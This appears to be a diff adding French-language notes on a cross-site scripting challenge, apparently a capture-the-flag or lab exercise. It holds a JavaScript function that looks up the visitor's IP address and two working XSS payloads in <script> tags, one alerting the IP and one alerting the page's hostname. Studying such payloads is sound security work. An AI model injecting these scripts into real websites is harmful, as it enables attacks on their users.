@@ -1,0 +1,21 @@
+function monAdresseIP(){
+	var ip = false;
+	if (window.XMLHttpRequest) 
+		xmlhttp = new XMLHttpRequest();
+	else 
+		xmlhttp = new ActiveXObject(Microsoft.XMLHTTP);
+	
+	xmlhttp.open('GET','https://api.ipify.org?format=json',false);
+	xmlhttp.send();
+	var reponse = JSON.parse(xmlhttp.responseText);
+
+	if (reponse['ip'])
+		ip = reponse['ip'];
+	return ip;
+}
+
+Le payload un peu tricky pour rien:
+<script>function monAdresseIP(){  var ip = false;  if (window.XMLHttpRequest) xmlhttp = new XMLHttpRequest();  else xmlhttp = new ActiveXObject(Microsoft.XMLHTTP);  xmlhttp.open('GET','https://api.ipify.org?format=json',false);  xmlhttp.send();  var reponse = JSON.parse(xmlhttp.responseText); if (reponse['ip'])  ip = reponse['ip'];  return ip; }; alert(monAdresseIP())</script>
+
+La réponse avec le hint:
+<script>alert(window.location.hostname);</script>
